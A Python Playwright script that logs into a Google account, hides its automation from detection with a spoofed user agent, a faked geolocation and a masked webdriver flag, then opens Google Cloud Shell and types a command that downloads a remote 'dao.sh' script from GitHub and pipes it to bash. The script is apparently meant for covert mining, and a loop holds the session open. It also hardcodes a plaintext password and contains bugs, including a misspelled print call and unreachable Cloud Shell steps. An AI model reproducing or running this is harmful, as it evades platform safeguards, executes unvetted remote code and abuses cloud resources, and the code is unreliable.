
import nest_asyncio
import asyncio
import logging
import random
from pyvirtualdisplay import Display
from playwright.async_api import Playwright, async_playwright, expect, BrowserContext, Page
from IPython.display import Image, display
nest_asyncio.apply()
display_virtual = Display(visible=0, size=(1280, 800))
display_virtual.start()
FIXED_VIEWPORT = {"width": 1280, "height": 800}
def get_random_browser_config_inner():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    DIVERSE_LINUX_CHROME_USER_AGENTS = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    ]
    selected_user_agent = random.choice(DIVERSE_LINUX_CHROME_USER_AGENTS)
    selected_viewport = FIXED_VIEWPORT
    base_args = [
        "--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--no-zygote",
        "--disable-features=site-per-process", "--disable-accelerated-2d-canvas", "--no-first-run",
        "--no-default-browser-check", "--disable-notifications", "--disable-popup-blocking",
        "--disable-infobars", "--disable-blink-features=AutomationControlled",
        "--disable-background-networking", "--disable-background-timer-throttling",
        "--disable-backgrounding-occluded-windows", "--disable-renderer-backgrounding",
        "--disable-breakpad", "--disable-component-update", "--disable-domain-reliability",
        "--disable-sync", "--enable-automation", "--disable-extensions",
        "--disable-software-rasterizer", "--mute-audio", "--autoplay-policy=no-user-gesture-required",
    ]
    chrome_args = base_args + [f"--window-size={selected_viewport['width']},{selected_viewport['height']}"]
    random.shuffle(chrome_args)
    return selected_user_agent, selected_viewport, chrome_args
async def login_gmail(email: str, password: str):
    ua, vp, args = get_random_browser_config_inner()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False, args=args)
        context: BrowserContext = await browser.new_context(
            user_agent=ua,
            viewport=vp,
            locale='en-US',
            timezone_id="Asia/Ho_Chi_Minh",
            geolocation={"longitude": 106.660172, "latitude": 10.762622, "accuracy": 100},
            permissions=["geolocation"],
            extra_http_headers={"Accept-Language": "en-US,en;q=0.9"}
        )
        

        # Ẩn navigator.webdriver
        await context.add_init_script("""Object.defineProperty(navigator, 'webdriver', { get: () => undefined });""")
        a = 0
        page = await context.new_page()
        async def Dangnhap():
         a = 0
         while True:
            a = a + 1
            try:
                print("Đang thực hiện hành động đăng nhập gmail ")                
                try:
                 await page.goto("https://accounts.google.com")
                except:
                 print("Truy nhap den trang https://accounts.google.com that bai ")
                 continue
                try:  
                    await page.locator("input[type='email']").fill(email)
                    await page.locator("button:has-text('Next')").click()
                except:
                 print("dien ten dang nhap that bai") 
                 continue
                try:
                    await page.locator("input[type='password']").fill(password)
                    await page.locator("button:has-text('Next')").click()
                    await asyncio.sleep(5)
                except:
                    print("dien mat khau that bai")
                    continue
                return 
                break
            except Exception as e:
                print("loi")
                if a == 5:
                 print("Dang nhap that bai.")
                 return None
            return 1
         print("Điều hướng đến Google Cloud Shell...")
         a = 0
         while True:
             a = a +1
             if a == 5:
                return
             try: 
                await page.goto("https://shell.cloud.google.com", timeout=120000)
                prrint(7)
                await page.get_by_role("checkbox", name="I agree that my use of any").check(timeout = 150000)
                prrint(6)
                await page.get_by_role("button", name="Start Cloud Shell").click(timeout=120000)
                prrint(5)
                await page.get_by_role("button", name="Authorize").click(timeout=180000)
                prrint(4)
                await page.locator("#cloud-shell-editor").content_frame.locator(".gettingStartedSlideDetails > div").click(timeout=500000)
                prrint(3) 
                await page.locator("#cloud-shell-editor").content_frame.get_by_role("button", name="Inspect this in the").press("ControlOrMeta+`", timeout=500000)
                prrint(2)
                await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").click(timeout=500000)
                prrint(1) 
                await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").fill("curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | bash", timeout=500000)
                await page.keyboard.press("Enter", delay=2)
                await page.screenshot(path="error.png", full_page=True)
                display(Image("error.png"))
                while True:
                 None
             except Exception as e:
                await page.screenshot(path="error.png", full_page=True)
                display(Image("error.png"))
        await Dangnhap() 
async def main():
    email = "thayemail"  # Thay email của bạn vào đây
    pw = "Lananh255"       # Thay mật khẩu của bạn vào đây
    await login_gmail(email, pw)

# Chạy hàm chính
if __name__ == "__main__":
    asyncio.run(main())
